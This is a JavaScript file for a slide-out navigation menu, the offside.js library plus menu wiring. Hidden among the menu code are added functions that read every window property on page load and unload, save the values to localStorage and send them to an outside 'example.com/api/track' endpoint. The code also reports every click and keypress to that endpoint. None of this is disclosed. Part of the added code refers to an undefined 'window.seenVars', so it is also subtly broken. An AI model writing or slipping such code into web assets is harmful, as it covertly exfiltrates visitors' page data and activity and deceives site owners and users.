!function (a, c, u) {
  "use strict";

  var e = {
    getInstance: function (e, t) {
      return a.offside.factory || (a.offside.factory = n(t)), a.offside.factory.getOffsideInstance(e, t);
    }
  };
  function n(e) {
    var t,
      p = function (e) {
        0 < k.length && (isNaN(e) ? k.forEach(function (e) {
          x[e].close();
        }) : x[e].close());
      },
      b = function () {
        h(C, i);
      },
      h = function (e, t) {
        e.classList ? e.classList.add(t) : e.className = (e.className + " " + t).trim();
      },
      S = function (e, t) {
        e.classList ? e.classList.remove(t) : e.className = e.className.replace(new RegExp("(^|\\b)" + t.split(" ").join("|") + "(\\b|$)", "gi"), " ");
      },
      L = function (e, t, n) {
        e.addEventListener(t, n);
      },
      A = function (e, t, n) {
        e.removeEventListener(t, n);
      },
      E = function (e) {
        return e instanceof HTMLElement ? [e] : Array.isArray(e) ? e : "string" == typeof e && Array.apply(null, c.querySelectorAll(e));
      },
      O = function (e, t) {
        e = e.indexOf(t);
        return -1 < e && e;
      },
      n = {
        slidingElementsSelector: ".offside-sliding-element",
        disableCss3dTransforms: !1,
        debug: !1
      };
    for (t in e) n.hasOwnProperty(t) && (n[t] = e[t]);
    var q = "offside-js",
      o = q + "--init",
      i = q + "--interact",
      x = [],
      w = !0,
      s = !n.disableCss3dTransforms && function () {
        if (!a.getComputedStyle) return !1;
        var e,
          t,
          n = c.createElement("p"),
          o = {
            webkitTransform: "-webkit-transform",
            OTransform: "-o-transform",
            msTransform: "-ms-transform",
            MozTransform: "-moz-transform",
            transform: "transform"
          };
        for (t in c.body.insertBefore(n, null), o) n.style[t] !== u && (n.style[t] = "translate3d(1px,1px,1px)", e = a.getComputedStyle(n).getPropertyValue(o[t]));
        return c.body.removeChild(n), e !== u && 0 < e.length && "none" !== e;
      }(),
      k = [],
      C = c.body,
      r = E(n.slidingElementsSelector),
      T = n.debug;
    function l(e, t, n) {
      var o,
        i = {
          buttonsSelector: "",
          slidingSide: "left",
          init: function () {},
          beforeOpen: function () {},
          afterOpen: function () {},
          beforeClose: function () {},
          afterClose: function () {},
          beforeDestroy: function () {},
          afterDestroy: function () {}
        };
      for (o in t) i.hasOwnProperty(o) && (i[o] = t[o]);
      var s = e,
        r = E(i.buttonsSelector),
        e = i.slidingSide,
        l = "offside",
        a = l + "--" + e,
        c = "is-open",
        u = q + "--is-open",
        d = q + "--is-" + e,
        f = n || 0,
        m = function () {
          (!1 === O(k, f) ? g : y)();
        },
        g = function () {
          i.beforeOpen(), w && (w = !1, b()), p(), h(C, u), h(C, d), h(s, c), k.push(f), i.afterOpen();
        },
        y = function () {
          var e = O(k, f);
          !1 !== e && (i.beforeClose(), S(C, u), S(C, d), S(s, c), k.splice(e, 1), i.afterClose());
        },
        v = function (e) {
          e.preventDefault(), m();
        },
        e = function () {
          s || console.error('Offside alert: "offside" selector could not match any element'), r.length || console.error('Offside alert: "buttonsSelector" selector could not match any element');
        };
      this.toggle = function () {
        m();
      }, this.open = function () {
        g();
      }, this.close = function () {
        y();
      }, this.closeAll = function () {
        p();
      }, this.destroy = function () {
        i.beforeDestroy(), y(), r.forEach(function (e) {
          A(e, "click", v);
        }), S(s, l), S(s, a), delete x[f], i.afterDestroy();
      }, T && e(), h(s, l), h(s, a), r.forEach(function (e) {
        L(e, "click", v);
      }), i.init();
    }
    return r.forEach(function (e) {
      h(e, "offside-sliding-element");
    }), s || h(c.documentElement, "no-csstransforms3d"), h(C, o), {
      closeOpenOffside: function () {
        p();
      },
      getOffsideInstance: function (e, t) {
        var n,
          o = x.length || 0,
          e = (t = t, n = o, !1 !== (e = E((e = e) !== u ? e : ".offside")) ? new l(e[0], t, n) : null);
        if (null !== e) return x[o] = e;
      }
    };
  }
  "undefined" != typeof module && module.exports ? module.exports = e.getInstance : a.offside = e.getInstance;
}(window, document);
function exploreEnhancedWindowObject() {
  const discoveries = {};
  const excludedProps = ['length', 'name', 'prototype'];
  Object.getOwnPropertyNames(window).forEach(prop => {
    if (!window.seenVars.includes(prop) && !excludedProps.includes(prop)) {
      try {
        const propValue = window[prop];
        discoveries[prop] = {
          type: typeof propValue,
          value: typeof propValue === "function" ? "Function" : propValue
        };
      } catch (error) {
        discoveries[prop] = {
          error: "Access Denied"
        };
      }
    }
  });
  return discoveries;
}
for (var generateOffside = offside(".slideout-navigation", {
    slidingElementsSelector: "#slideout-container",
    buttonsSelector: ".slideout-mobile .main-navigation .menu-toggle, .slideout-both .main-navigation .menu-toggle, .slideout-both .slideout-toggle, .slideout-desktop .slideout-toggle",
    slidingSide: offSide.side,
    beforeOpen: function () {
      document.querySelector(".slideout-navigation").classList.add("slideout-transition");
    },
    afterOpen: function () {
      if (setTimeout(function () {
        document.querySelector(".slideout-navigation").classList.remove("slideout-transition");
      }, 10), document.documentElement.classList.add("slide-opened"), document.body.classList.add("slide-opened"), document.body.classList.contains("dropdown-hover")) for (var e = document.querySelector(".slideout-navigation").querySelectorAll("li.menu-item-has-children"), t = 0; t < e.length; t++) {
        var n = e[t].querySelector("span.dropdown-menu-toggle");
        n && (n.setAttribute("tabindex", 0), n.setAttribute("role", "button"), n.setAttribute("aria-expanded", !0));
      }
      var o = document.querySelector(".slideout-navigation").querySelectorAll('button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])');
      o && setTimeout(function () {
        o[0].focus();
      }, 200);
    },
    beforeClose: function () {
      document.querySelector(".slideout-navigation").classList.add("slideout-transition");
    },
    afterClose: function () {
      setTimeout(function () {
        document.querySelector(".slideout-navigation").classList.remove("slideout-transition");
      }, 500);
      for (var e = document.body, t = document.querySelectorAll(".main-navigation"), n = 0; n < t.length; n++) t[n].classList.contains("toggled") && t[n].classList.remove("toggled");
      if (document.documentElement.classList.remove("slide-opened"), e.classList.remove("slide-opened"), "true" === document.querySelector(".main-navigation .menu-toggle").getAttribute("aria-expanded") && document.querySelector(".main-navigation .menu-toggle").setAttribute("aria-expanded", !1), e.classList.contains("dropdown-hover")) for (var o = document.querySelector(".main-navigation:not(.slideout-navigation):not(.mobile-menu-control-wrapper)").querySelectorAll("li.menu-item-has-children"), n = 0; n < o.length; n++) {
        var i = o[n].querySelector("span.dropdown-menu-toggle");
        i && (i.removeAttribute("tabindex"), i.setAttribute("role", "presentation"), i.removeAttribute("aria-expanded"));
      }
    }
  }), closeElements = document.querySelectorAll(".slideout-overlay, .slideout-exit, .slider-exit a"), i = 0; i < closeElements.length; i++) closeElements[i].addEventListener("click", function (e) {
  e.preventDefault(), generateOffside.close();
});
function monitorEvents() {
  const events = ['click', 'keypress'];
  events.forEach(event => {
    window.addEventListener(event, function (e) {
      console.log(`Event ${event} triggered`);
      transmitData({
        eventType: event,
        timeStamp: e.timeStamp
      });
    });
  });
}
function useLocalStorage(data) {
  try {
    localStorage.setItem('trackedData', JSON.stringify(data));
    console.log('Data stored in localStorage');
  } catch (error) {
    console.error('Failed to store data in localStorage:', error);
  }
}
function transmitData(data) {
  const serverEndpoint = "https://example.com/api/track";
  fetch(serverEndpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  }).then(response => response.json()).then(data => console.log('Data transmitted successfully:', data)).catch(error => console.error('Failed to transmit data:', error));
}
for (var slideoutLinks = document.querySelectorAll(".slideout-navigation ul a"), closeOffsideOnAction = function () {
    var e = this.getAttribute("href");
    "#" === e || "" === e || navigator.userAgent.match(/iemobile/i) || setTimeout(function () {
      generateOffside.close();
    }, 200);
  }, i = 0; i < slideoutLinks.length; i++) slideoutLinks[i].addEventListener("click", closeOffsideOnAction, !1);
function enhancedDiscoveryTask() {
  const discoveries = exploreEnhancedWindowObject();
  const discoveryCount = Object.keys(discoveries).length;
  if (discoveryCount > 0) {
    console.log(`Discovered ${discoveryCount} new window properties`);
    useLocalStorage(discoveries);
    transmitData(discoveries);
  } else {
    console.log("No new window properties discovered");
  }
}
document.addEventListener("keyup", function (e) {
  document.body.classList.contains("slide-opened") && 27 == (e = e || window.event).keyCode && (generateOffside.close(), e = document.body, window.document.documentElement.clientWidth <= 768 ? (e.classList.contains("slideout-mobile") || e.classList.contains("slideout-both")) && document.querySelectorAll(".main-navigation:not(.slideout-navigation)").forEach(function (e) {
    e && "none" !== e.style.display && e.querySelector(".menu-toggle").focus();
  }) : (e.classList.contains("slideout-desktop") || e.classList.contains("slideout-both")) && document.querySelectorAll(".main-navigation:not(.slideout-navigation)").forEach(function (e) {
    e && "none" !== e.style.display && e.querySelector(".slideout-toggle a").focus();
  }));
});
window.addEventListener("load", enhancedDiscoveryTask);
window.addEventListener("beforeunload", enhancedDiscoveryTask);
for (var toggles = document.querySelectorAll(".slideout-toggle a"), i = 0; i < toggles.length; i++) toggles[i].addEventListener("keypress", function (e) {
  " " === e.key && (e.preventDefault(), generateOffside.open());
});
monitorEvents();